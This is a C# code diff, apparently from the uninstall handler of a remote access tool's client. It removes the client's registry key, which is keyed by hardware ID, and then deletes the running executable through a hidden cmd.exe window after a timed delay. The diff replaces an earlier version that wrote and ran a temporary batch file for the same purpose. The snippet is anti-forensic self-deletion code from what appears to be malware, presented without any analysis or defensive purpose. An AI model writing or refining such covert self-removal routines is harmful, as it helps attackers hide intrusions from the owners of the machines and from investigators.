@@ -38,25 +38,14 @@ namespace Plugin.Handler
                 Registry.CurrentUser.CreateSubKey(@"SOFTWARE\", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteSubKey(Connection.Hwid);
             }
             catch { }
-
-            string batch = Path.GetTempFileName() + ".bat";
-            using (StreamWriter sw = new StreamWriter(batch))
-            {
-                sw.WriteLine("@echo off");
-                sw.WriteLine("timeout 3 > NUL");
-                sw.WriteLine("CD " + Application.StartupPath);
-                sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
-                sw.WriteLine("CD " + Path.GetTempPath());
-                sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
-            }
+            
             Process.Start(new ProcessStartInfo()
-            {
-                FileName = batch,
-                CreateNoWindow = true,
-                ErrorDialog = false,
-                UseShellExecute = false,
-                WindowStyle = ProcessWindowStyle.Hidden
-            });
+                {
+                    Arguments = "/C choice /C Y /N /D Y /T 5 & Del \"" + Application.ExecutablePath + "\"",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    FileName = "cmd.exe"
+                });
 
             Methods.ClientExit();
             Environment.Exit(0);
